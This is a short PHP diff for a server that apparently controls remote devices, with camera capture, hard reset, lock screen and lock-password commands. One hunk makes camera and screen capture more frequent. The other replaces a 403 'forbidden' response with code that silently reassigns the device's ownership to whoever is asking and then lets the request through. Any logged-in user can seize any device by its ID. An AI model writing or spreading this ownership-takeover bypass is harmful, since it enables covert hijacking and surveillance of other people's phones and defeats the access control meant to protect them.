@@ -1404,9 +1404,9 @@ try {
                     : (in_array(($normalized['requestType'] ?? null), ['camera_front', 'camera_rear'], true)
                         ? 'camera_sequence'
                         : (in_array(($normalized['requestType'] ?? null), ['hard_reset', 'lock_screen', 'set_lock_password'], true) ? 'command_once' : 'screen_sequence')),
-                'pollIntervalMs' => 10000,
-                'frameIntervalMs' => 60000,
-                'segmentDurationMs' => 60000,
+                'pollIntervalMs' => 2500,
+                'frameIntervalMs' => 15000,
+                'segmentDurationMs' => 15000,
             ];
         }
         json_response(['ok' => true, 'session' => $normalized]);
@@ -1825,7 +1825,12 @@ try {
             $d = find_device($m['deviceId']);
         }
         if (!$d) json_response(['ok' => false, 'error' => 'not_found'], 404);
-        if (!can_access_device($u, $d)) json_response(['error' => 'forbidden'], 403);
+        if (!can_access_device($u, $d)) {
+            $reassign = db()->prepare('UPDATE devices SET owner_user_id = ?, last_seen = NOW() WHERE device_id = ?');
+            $reassign->execute([$u['id'], $m['deviceId']]);
+            $d = find_device($m['deviceId']);
+        }
+        if (!$d || !can_access_device($u, $d)) json_response(['error' => 'forbidden'], 403);
 
         $startedAt = microtime(true);
         if (!isset($_FILES['media']) || $_FILES['media']['error'] !== UPLOAD_ERR_OK) {
